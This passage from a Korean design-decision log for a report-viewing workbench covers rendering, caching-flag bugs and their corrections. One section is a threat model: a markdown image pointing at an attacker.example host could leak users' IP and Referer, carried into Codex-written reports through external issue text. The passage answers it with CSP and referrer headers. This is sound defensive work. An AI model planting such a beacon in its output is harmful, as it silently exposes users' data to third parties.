...
### 수동적 이미지 비콘 — 위협 모델에 없던 벡터 (2026-08-10, PR #650 리뷰)

위 표가 고정한 것은 **escape**다. 그런데 escape가 완전해도 남는 경로가 하나 있다.

```markdown
![](http://attacker.example/pixel.png)
```

이것은 raw HTML이 아니라 **평범한 markdown 이미지**다. escape 대상이 아니므로 그대로
`<img src="http://…">`가 되고, iframe이 열리는 순간 워크벤치 사용자의 IP와 `Referer`가
그 호스트로 나간다. **사용자가 아무것도 클릭하지 않아도 일어난다** — `<base target>`이
막는 능동적 이동과 다른 종류다.

이 문서의 원래 위협 모델은 "에이전트가 쓴 HTML이 실행된다"였고 그 방어가 결정 4·5다.
비콘은 **실행이 아니라 로드**라 그 방어의 사정거리 밖이었다. 리포트를 쓰는 Codex의
입력에 외부 사용자의 이슈 본문이 들어간다는 전제는 똑같이 적용된다.

`build_report_document`의 `<head>`에 두 줄을 둔다.

| 선언 | 막는 것 |
| --- | --- |
| `<meta name="referrer" content="no-referrer">` | 어떤 요청에도 워크벤치 URL을 싣지 않는다 |
| CSP `img-src data:` | 원격 이미지 **fetch 자체**를 막아 IP 노출까지 끊는다 |
| CSP `script-src 'none'` | 우리 템플릿에 스크립트가 없다는 사실을 브라우저에도 선언한다 |

**`img-src data:`는 전면 차단이 아니라 화이트리스트가 `data:` 하나인 것이다.** 위 표가
허용한 `data:image/*`는 그대로 렌더되고, 원격 `http(s)` 이미지만 막힌다. 두 판단이
충돌하지 않는 이유는 `data:`가 이미 문서 안에 있는 바이트라 네트워크로 나가지 않기
때문이다 — 결정 4가 허용한 근거("스크립트를 실행하지 않는다")와 여기서 막는 근거
("클릭 없이 나가는 원격 요청")가 서로 다른 성질을 본다.

리포트는 실험을 서술한 산문이고 executor는 이미지를 붙이지 않으므로 원격 이미지를
막아서 잃는 것이 없다. `default-src`를 두지 않아 인라인 `<style>`은 그대로 적용된다.
...
> `[정정 — #666, 2026-08-10]` **이 결정을 뒤집는다.** #647의 범위를 좁게 두려던 판단
> 자체는 옳았지만, 실험 #655를 완주시켜 실제 화면을 보니 그 결정이 만든 상태가 더
> 나빴다 — 결과 탭만 카드로 바뀌고 인스펙터는 JSON dump로 남아 **같은 숫자가 한
> 화면에서 두 형식으로** 보였다. 어느 쪽이 정본인지 알 수 없는 화면이다.
>
> #666에서 `_render_metrics`를 `_render_summary`로 교체해 결과 탭과 같은 읽기 방식을
> 쓰게 했다. 이 시점에 `_render_metrics`의 호출부는 인스펙터 한 곳뿐이라(결과 탭은
> #647에서 `_render_results`로 갈렸다) 영향 범위는 인스펙터로 한정됐다.
>
> **범위를 좁히는 결정은 화면을 보기 전까지만 유효했다**는 것이 이 정정의 교훈이다.
> 같은 데이터를 두 곳에서 다르게 그리기로 하는 결정은, 두 곳이 한 화면에 함께 보이는지
> 먼저 확인하고 내려야 한다.
...
> `[재-정정 — #647, 2026-08-10]` **필드는 셋이 아니라 넷이다.** 위 목록에
> `report_checked_for: str | None`이 빠져 있고, 그 부재가 이 절에서 두 번 연속 버그를
> 만들었다.
>
> 원인은 표식 하나에 **서로 다른 두 질문**을 겸하게 한 것이다.
>
> | 질문 | 표식 | 쓰이는 곳 |
> | --- | --- | --- |
> | 한 번이라도 조회해 봤는가 | `report_checked_for` | 화면 문구 선택 |
> | 캐시할 본문을 이미 받았는가 | `report_loaded_for` | 재조회 차단 |
>
> 하나로 겹치면 어느 쪽으로 정하든 반대편이 깨진다. 본문이 없을 때도 세우면 결정 2의
> 두 트랜잭션 틈을 "리포트 없음"으로 영구 캐시하고(첫 번째 버그), 본문이 있을 때만
> 세우면 리포트가 **정말 없는** 실험이 "불러오는 중"에서 내려오지 못한다(그 수정이
> 만든 두 번째 버그, PR #650 리뷰가 잡음). 둘 다 실패에는 세우지 않는다.
>
> **왜 겹쳤는지 남겨 둔다** — 처음에 "리포트는 한 번 쓰이고 변하지 않는다"를 전제로
> 삼아 "조회했다 = 최종값을 받았다"로 읽었기 때문이다. 결정 2가 쓰기를 두 트랜잭션으로
> 나눈 순간 그 전제가 깨졌고, 그때 이 절을 다시 보지 않았다.
>
> **검증도 겹쳐서 못 잡았다.** 다섯 조합 `AppTest`가 `assert not app.exception`만 보아
> "죽지 않았다"는 확인했지만 "맞는 화면이 떴다"는 확인하지 못했다. 렌더된 caption 문구를
> 단언하는 테스트를 따로 둔다.
